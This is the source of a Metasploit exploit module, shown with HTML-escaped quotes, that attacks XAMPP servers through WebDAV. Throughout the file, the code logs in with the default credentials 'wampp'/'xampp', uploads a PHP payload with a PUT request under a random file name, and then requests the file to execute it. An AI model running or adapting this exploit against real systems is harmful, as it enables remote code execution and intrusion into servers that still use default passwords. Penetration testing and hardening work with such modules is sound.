# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;XAMPP WebDAV PHP Upload&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits weak WebDAV passwords on XAMPP servers.
                    It uses supplied credentials to upload a PHP payload and
                    execute it.
            },
            &#039;Author&#039;      => [&#039;thelightcosine <thelightcosine[at]metasploit.com&#039;],
            &#039;Version&#039;     => &#039;$Revision$&#039;,
            &#039;Platform&#039;    => &#039;php&#039;,
            &#039;Arch&#039;        => ARCH_PHP,
            &#039;Targets&#039;     =>
                [
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0
        )
 
        register_options(
            [
                OptString.new(&#039;PATH&#039;, [ true,  "The path to attempt to upload", &#039;/webdav/&#039;]),
                OptString.new(&#039;FILENAME&#039;, [ false ,  "The filename to give the payload. (Leave Blank for Random)"]),
                OptString.new(&#039;RUSER&#039;, [ true,  "The Username to use for Authentication", &#039;wampp&#039;]),
                OptString.new(&#039;RPASS&#039;, [ true,  "The Password to use for Authentication", &#039;xampp&#039;])
            ], self.class)
    end
 
 
 
    def exploit
        uri = build_path
        print_status "Uploading Payload to #{uri}"
        res,c = send_digest_request_cgi({
                    &#039;uri&#039;     => uri,
                    &#039;method&#039;  => &#039;PUT&#039;,
                    &#039;data&#039;  => payload.raw,
                    &#039;DigestAuthUser&#039; => datastore[&#039;RUSER&#039;],
                    &#039;DigestAuthPassword&#039; => datastore[&#039;RPASS&#039;]
                }, 25)
        unless (res.code == 201)
            print_error "Failed to upload file!"
            return
        end
        print_status "Attempting to execute Payload"
        res = send_request_cgi({
            &#039;uri&#039;          =>  uri,
            &#039;method&#039;       => &#039;GET&#039;
        }, 20)
    end
 
 
 
    def build_path
        if datastore[&#039;PATH&#039;][0,1] == &#039;/&#039;
            uri_path = datastore[&#039;PATH&#039;].dup
        else
            uri_path = &#039;/&#039; + datastore[&#039;PATH&#039;].dup
        end
        uri_path << &#039;/&#039; unless uri_path.ends_with?(&#039;/&#039;)
        if datastore[&#039;FILENAME&#039;]
            uri_path << datastore[&#039;FILENAME&#039;]
            uri_path << &#039;.php&#039; unless uri_path.ends_with?(&#039;.php&#039;)
        else
            uri_path << Rex::Text.rand_text_alphanumeric(7)
            uri_path << &#039;.php&#039;
        end
        return uri_path
    end
 
end



